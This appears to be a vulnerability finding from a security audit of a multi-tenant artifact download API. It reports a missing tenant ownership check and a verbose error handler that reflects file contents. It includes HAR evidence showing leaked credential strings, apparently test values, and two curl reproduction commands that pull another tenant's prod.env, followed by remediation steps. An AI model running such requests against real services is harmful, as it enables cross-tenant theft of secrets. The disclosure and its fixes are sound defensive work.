## Findings

1. **Cross-tenant artifact access via missing ownership check on `POST /api/v1/artifacts/{project_id}/download`**: the `download_artifact` Flask view looks up the project by `project_id` alone (`db.get_project_by_id(project_id)`) and then constructs the NAS file path using the project owner's `tenant_id` — without verifying that the caller's JWT `tenant_id` matches `project.tenant_id` (RISK-DIB-077 — commented-out ownership check). A caller authenticated as `tenant-low-tier` can request `proj-X` (owned by `tenant-critical-A`) and the service will resolve the path to `/mnt/artifacts/tenant-critical-A/proj-X/prod.env`.

2. **Sensitive credential exfiltration via verbose error handler (Pattern 6.2)**: the global `handle_generic_error` handler includes `error_detail = str(e)` in the JSON response when a `FileAccessError` occurs. When the attacker includes `"format": "BINARY"` in the request body to trigger the streaming failure path, the `FileAccessError` exception message contains the first 512 bytes of the file that caused the error — in this case the raw content of `prod.env`. The HAR 500 response body embeds `DB_HOST`, `CRITICAL_DB_PASS`, `IAM_ACCESS_KEY`, `KMS_KEY_ID`, `API_SECRET_V2`, `VAULT_TOKEN`, and `SERVICE_ACCOUNT_ID` in plaintext.

## Evidence

- **HAR POST request** (`startedDateTime: 2026-04-09T18:35:15.011Z`, elapsed 215 ms): `POST https://api.sentinel.daps.gov/api/v1/artifacts/proj-X/download`; JWT encodes `tenant_id: tenant-low-tier`, `role: CONTRACTOR`; body `{"filename": "prod.env", "format": "BINARY"}`.
- **Tenant mismatch**: caller `tenant_id` is `tenant-low-tier`; `proj-X` belongs to `tenant-critical-A` (section 3.2 and DB schema — `tenant_id` is the critical authorization field). The service resolves `target_tenant_id = project.tenant_id = "tenant-critical-A"` and constructs path `/mnt/artifacts/tenant-critical-A/proj-X/prod.env`.
- **HAR response**: HTTP 500, `x-process-time-ms: 180`; body `{"status": "ERROR_TRACE", "code": "ARTIFACT_STREAM_FAILURE", "message": "FileAccessError: Cannot stream artifact 'prod.env' as requested format BINARY. First 512 bytes: \nDB_HOST=proj-x-critical-rds.db\nCRITICAL_DB_PASS=f88192a-44f2-8921-xyz\nIAM_ACCESS_KEY=AKIA_CRIT_88192A_TEST\nKMS_KEY_ID=arn:aws:kms:us-gov-west-1:9912:key/abc-123\nAPI_SECRET_V2=e1f2g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8w9x0\nVAULT_TOKEN=hvs.AbCdEfG12345\n...", "project_id": "proj-X"}` — multiple classified credentials leaked in the error payload.
- **Flawed view** (section 6.0): the commented-out check `# FLAW: Missing: if project.tenant_id != request.user.tenant_id: return 403` is never executed; the service uses `target_tenant_id = project.tenant_id` to build the file path, deriving it from the database record of the victim tenant — not from the caller's JWT.
- **Verbose error handler** (section 6.0): `error_detail = str(e)` for `FileAccessError` instances included verbatim in the JSON response `message` field, with no sanitisation.

## Reproduction

Step 1 — confirm endpoint is accessible with `tenant-low-tier` credentials against an own project:

```bash
curl -i -X POST "https://api.sentinel.daps.gov/api/v1/artifacts/proj-Y/download" \
  -H "Authorization: Bearer <JWT_tenant-low-tier_CONTRACTOR>" \
  -H "Content-Type: application/json" \
  -d '{"filename": "Dockerfile"}'
```

Expected: HTTP 200 or appropriate response for legitimate project.

Step 2 — request a cross-tenant project's sensitive file with BINARY format to trigger the error-reflection path:

```bash
curl -i -X POST "https://api.sentinel.daps.gov/api/v1/artifacts/proj-X/download" \
  -H "Authorization: Bearer <JWT_tenant-low-tier_CONTRACTOR>" \
  -H "Content-Type: application/json" \
  -d '{"filename": "prod.env", "format": "BINARY"}'
```

Expected secure outcome: HTTP 403 — `tenant-low-tier` does not own `proj-X` (owned by `tenant-critical-A`).  
Observed vulnerable outcome: HTTP 500 `ARTIFACT_STREAM_FAILURE` with `message` containing the plaintext contents of `tenant-critical-A`'s `prod.env`, including `CRITICAL_DB_PASS=f88192a-44f2-8921-xyz`, `IAM_ACCESS_KEY=AKIA_CRIT_88192A_TEST`, `VAULT_TOKEN=hvs.AbCdEfG12345`.

## Remediation

- **Add tenant ownership check immediately after project lookup**: in `download_artifact`, after `project = db.get_project_by_id(project_id)`, add `if project.tenant_id != request.user.tenant_id: return jsonify({"error": "Access denied."}), 403`. This single check closes the cross-tenant access path.
- **Disable verbose error handler in production (RISK-DIB-077)**: in `handle_generic_error`, replace `error_detail = str(e)` with `error_detail = "An internal error occurred."` for all production deployments. Remove `app.debug` references from production manifests. File content must never appear in HTTP error responses.
- **Sanitise filename input**: validate `filename` against an allowlist of expected artifact types (e.g., `.tfstate`, `Dockerfile`, `*.zip`) and reject `prod.env`, `.env`, and any secret-bearing filename patterns at the API layer before the file path is constructed.
- **Enforce clearance level check**: the JWT contains `clearance_level`; the project record has `clearance_level` — validate that the caller's clearance is sufficient for the target project, even for own-tenant requests.
